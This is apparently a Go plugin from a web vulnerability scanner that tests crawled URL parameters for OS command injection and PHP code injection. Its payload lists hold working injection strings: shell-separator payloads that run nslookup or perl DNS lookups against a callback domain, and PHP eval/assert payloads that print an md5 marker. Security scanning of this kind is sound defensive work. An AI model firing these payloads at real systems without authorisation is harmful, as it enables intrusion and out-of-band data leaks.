package cmdinject

/**
  @author: yhy
  @since: 2023/1/30
  @desc: //TODO
**/
import (
	"github.com/thoas/go-funk"
	"github.com/yhy0/Jie/logging"
	"github.com/yhy0/Jie/pkg/input"
	"github.com/yhy0/Jie/pkg/output"
	"github.com/yhy0/Jie/pkg/protocols/http"
	"github.com/yhy0/Jie/pkg/reverse"
	"github.com/yhy0/Jie/pkg/util"
	"regexp"
	"strings"
	"time"
)

func Scan(in *input.CrawlResult) {
	res, payload, isvul := startTesting(in)
	if isvul {
		output.OutChannel <- output.VulMessage{
			DataType: "web_vul",
			Plugin:   "CMD-INJECT",
			VulData: output.VulData{
				CreateTime: time.Now().Format("2006-01-02 15:04:05"),
				Target:     in.Url,
				Method:     in.Method,
				Ip:         in.Ip,
				Param:      in.Kv,
				Request:    res.RequestDump,
				Response:   res.ResponseDump,
				Payload:    payload,
			},
			Level: output.Critical,
		}
	}

	logging.Logger.Debugf("cmd inject vulnerability not found")
}

func startTesting(in *input.CrawlResult) (*http.Response, string, bool) {
	variations, err := http.ParseUri(in.Url, []byte(in.Resp.Body), in.Method, in.ContentType, in.Headers)
	if err != nil {
		logging.Logger.Errorln(err)
		return nil, "", false
	}

	if in.IsSensorServerEnabled {
		var domainPayloadList = []string{
			`|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
			// `&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&\'\\"`0&(nslookup {domain}||perl -e "gethostbyname(\'{domain}\')")&`\'`,
			`;(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")|(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")&(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`,
			"(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
			"$(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")",
			"`(nslookup {domain}||perl -e \"gethostbyname('{domain}')\")`",
		}

		flag := util.RandLowLetterNumber(10)
		dnslog := reverse.New("", flag)

		if variations != nil {
			for _, p := range variations.Params {
				for _, payload := range domainPayloadList {
					s1 := strings.ReplaceAll(payload, "{domain}", dnslog.Url)

					originpayload := variations.SetPayloadByindex(p.Index, in.Url, s1, in.Method)

					logging.Logger.Debugln("payload:", originpayload)
					res, err := http.Request(in.Url, originpayload, in.Method, false, in.Headers)
					if err != nil {
						continue
					}

					if reverse.Check(dnslog, 2) {
						return res, originpayload, true
					}
				}
			}
		}

	}

	//if SensorServer has disable

	//PHP code injection
	var payloads = []string{
		`;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));`,
		`';print(md5(31337));$a='`,
		`\";print(md5(31337));$a=\"`,
		`${@print(md5(31337))}`,
		`${@print(md5(31337))}\\`,
		`'.print(md5(31337)).'`,
	}

	if variations != nil {
		for _, p := range variations.Params {
			for _, payload := range payloads {
				originpayload := variations.SetPayloadByindex(p.Index, in.Url, payload, in.Method)

				logging.Logger.Debugln("payload:", originpayload)
				res, err := http.Request(in.Url, originpayload, in.Method, false, in.Headers)
				if err != nil {
					continue
				}

				if funk.Contains(res.ResponseDump, "6f3249aa304055d63828af3bfab778f6") {
					return res, payload, true
				}
				var regexphp = `Parse error: syntax error,.*?\sin\s.*?\(\d+\).*?eval\(\)\'d\scode\son\sline\s<i>\d+<\/i>`
				re, _ := regexp.Compile(regexphp)
				result := re.FindString(res.ResponseDump)
				if result != "" {
					return res, payload, true
				}

			}
		}
	}

	return nil, "", false
}
